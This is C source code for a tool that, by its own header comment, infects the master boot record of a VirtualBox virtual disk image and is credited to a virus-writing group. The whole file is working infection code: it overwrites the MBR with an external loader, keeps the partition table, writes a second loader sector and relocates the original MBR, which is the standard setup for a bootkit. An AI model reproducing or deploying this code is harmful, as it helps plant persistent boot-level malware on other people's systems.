/* A simple tool to infect the MBR of a virtual disk by WarGame/DoomRiderz */

#include <stdio.h>
#include <string.h>

main(int argc,char *argv[])
{
	FILE *in = NULL,*in1 = NULL,*out = NULL;
	char buf[512];
	char buf1[512];
	char original[512];

        if(argv[1] == NULL || argv[2] == NULL)
	{
		printf("Usage: %s <vdi file> <offdata of the vdi>\n",argv[0]);
		return -1;
	}

	if((in = fopen("loader.bin","r")) == NULL)
	{
		printf("can't open loader.bin\n");
		return -1;
	}

	if((out = fopen(argv[1],"r+")) == NULL)
	{	
		printf("can't open %s\n",argv[1]);
		return -1;
	}

	if((in1 = fopen("loader1.bin","r")) == NULL)
	{
		printf("can't open loader1.bin\n");
		return -1;
	}

	fread(buf,512,1,in);
	fread(buf1,512,1,in1);
	fseek(out,atoi(argv[2]),SEEK_SET); /* seek to MBR pointed by offData */
	fread(original,512,1,out); /* read the original mbr */
	fseek(out,-512,SEEK_CUR);
	memcpy(buf+446,original+446,64); /* put the partition table in our loader */
	fwrite(buf,512,1,out); /* write loader (sector 1) */
	fwrite(buf1,512,1,out); /* write loader 1 (sector 2) */
	fwrite(original,512,1,out); /* write original mbr (sector 3) */
	fclose(in);
	fclose(out);
	fclose(in1);
	printf("Done\n");
	return 0;
}
